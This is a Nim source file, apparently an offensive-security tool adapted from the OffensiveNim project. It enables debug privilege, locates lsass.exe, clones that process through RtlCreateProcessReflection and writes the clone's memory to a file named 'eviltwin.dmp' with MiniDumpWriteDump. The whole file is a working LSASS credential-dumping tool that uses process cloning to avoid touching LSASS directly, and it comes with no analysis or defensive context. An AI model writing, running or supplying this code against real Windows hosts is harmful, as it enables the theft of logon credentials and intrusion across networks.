import winim

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

# Appropiated from https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/blockdlls_acg_ppid_spoof_bin.nim
proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process_name:
                pid = entry.th32ProcessID
                break

    return pid

proc SetPrivilege(hToken: HANDLE, lpszPrivilege: LPCTSTR, bEnablePrivilege: BOOL): bool =
    var
        tp: TOKEN_PRIVILEGES
        luid: LUID

    if LookupPrivilegeValue(NULL, lpszPrivilege, addr luid) == 0:
        echo "[-] LookupPrivilegeValue error: ", GetLastError()
        return true

    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = if bEnablePrivilege: SE_PRIVILEGE_ENABLED else: 0

    if AdjustTokenPrivileges(hToken, cast[WINBOOL](FALSE), addr tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), cast[PTOKEN_PRIVILEGES](NULL), cast[PDWORD](NULL)) == 0:
        echo "[-] AdjustTokenPrivileges error: ", GetLastError()
        return false

    if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
        echo "[-] The token does not have the specified privilege."
        return false

    return true

const
  RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED = 0x00000001
  RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES = 0x00000002
  RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE = 0x00000004

type
  T_CLIENT_ID = object
    UniqueProcess: HANDLE
    UniqueThread: HANDLE
  
  RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION = object
    ReflectionProcessHandle: HANDLE
    ReflectionThreadHandle: HANDLE
    ReflectionClientId: CLIENT_ID

  PRTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION = ptr RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION

  RtlCreateProcessReflectionFunc = proc(
    ProcessHandle: HANDLE,
    Flags: ULONG,
    StartRoutine: PVOID,
    StartContext: PVOID,
    EventHandle: HANDLE,
    ReflectionInformation: ptr RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION
  ): NTSTATUS {.stdcall.}
  
  ReflectionContext = object
    unk1: DWORD64
    Flags: ULONG
    StartRoutine: PVOID
    StartContext: PVOID
    unk2: PVOID
    unk3: PVOID
    EventHandle: PVOID

when isMainModule:
    var hNtdll: HMODULE = LoadLibrary("ntdll.dll")
    var info: RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION

    var hProcess: HANDLE = GetCurrentProcess()
    var hToken: HANDLE
    echo "[*] Checking for Debug privilege"
    if OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, addr hToken) != 0:
        if SetPrivilege(hToken, SE_DEBUG_NAME, TRUE):
            echo "[+] Debug privilege enabled!"
            CloseHandle(hToken)
        else:
            echo "[-] Failed to enable debug privilege"
            echo "[*] Quitting!"
            #discard readLine(stdin)

    var RtlCreateProcessReflection: RtlCreateProcessReflectionFunc = cast[RtlCreateProcessReflectionFunc](GetProcAddress(hNtdll, "RtlCreateProcessReflection"))
    echo "[*] Finding PID"
    var pid = GetProcessByName("lsass.exe")
    echo "[*] PID: ", pid
    echo "[*] Getting handle to process"
    var victimHandle: HANDLE = OpenProcess((PROCESS_VM_OPERATION or PROCESS_VM_WRITE or PROCESS_CREATE_THREAD or PROCESS_DUP_HANDLE), TRUE, pid)
    if victimHandle == 0:
        echo "[-] Error: ", GetLastError(), ". Failed to obtain handle to process!"
        echo "[*] Quitting!"
        quit(1)
    else:
        echo "[+] Obtained handle to process!"
    echo "[*] Cloning process"
    var reflectRet: NTSTATUS = RtlCreateProcessReflection(victimHandle, cast[ULONG](RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES), NULL, NULL, cast[HANDLE](NULL), addr info)
    #echo reflectRet
    if GetLastError() == 0:
        #echo info
        echo "[+] Succesfully cloned to new PID: ", cast[DWORD](info.ReflectionClientId.UniqueProcess)
    elif GetLastError() == 5:
        echo "[-] Error cloned: Access Denied!"
        #discard readLine(stdin)
        echo "[*] Quitting!"
        quit(1)
    else:
        echo "[-] Error cloned: error ", GetLastError()
        #discard readLine(stdin)
        echo "[*] Quitting!"
        quit(1)

    #discard readLine(stdin)

    var outFile = CreateFile("eviltwin.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, cast[HANDLE](NULL))
    if MiniDumpWriteDump(info.ReflectionProcessHandle, cast[DWORD](info.ReflectionClientId.UniqueProcess), outFile, 0x00000002, NULL, NULL, NULL) == TRUE:
        echo "[+] Sucessfully dumped process!"
        TerminateProcess(info.ReflectionProcessHandle, 0)
    #discard readLine(stdin)
